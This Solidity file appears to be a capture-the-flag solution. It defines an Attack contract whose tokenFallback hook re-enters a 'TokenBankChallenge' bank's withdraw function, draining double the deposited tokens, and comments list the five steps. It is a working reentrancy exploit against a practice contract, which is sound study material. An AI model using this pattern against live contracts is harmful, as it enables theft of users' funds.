// 1. (Bank) player.withdraw(500000 * 10**18)
// 2. (Token contract) player.approve(Attack, 500000 * 10**18)
// 3. (Token contract) Attack.transferFrom(player, this, 500000 * 10**18)
// 4. (Token contract) Attack.transfer(Bank, 500000 * 10**18)
// 5. (Bank) Attack.withdraw(500000 * 10**18)

pragma solidity ^0.8.0;

interface TokenBankChallenge {
     function withdraw(uint256) external;
}

interface SimpleERC223Token {
     function transfer(address, uint256) external returns (bool);
     function transferFrom(address, address, uint256) external returns (bool);
}

contract Attack {
    bool flag = true;
    TokenBankChallenge victim;
    SimpleERC223Token token;
    address player;
    constructor(address _addr, address _addr2, address _addr3){
        victim = TokenBankChallenge(_addr);
        token = SimpleERC223Token(_addr2);
        player = _addr3;
    }

    function tokenFallback(address from, uint256 value, bytes memory data) public {
        if (flag) {
          flag = false;
          victim.withdraw(500000 * 10**18);
        }
    }

    function attacking() public {
        token.transferFrom(player, address(this), 500000 * 10**18);
        token.transfer(address(victim), 500000 * 10**18);
        victim.withdraw(500000 * 10**18);
    }
}
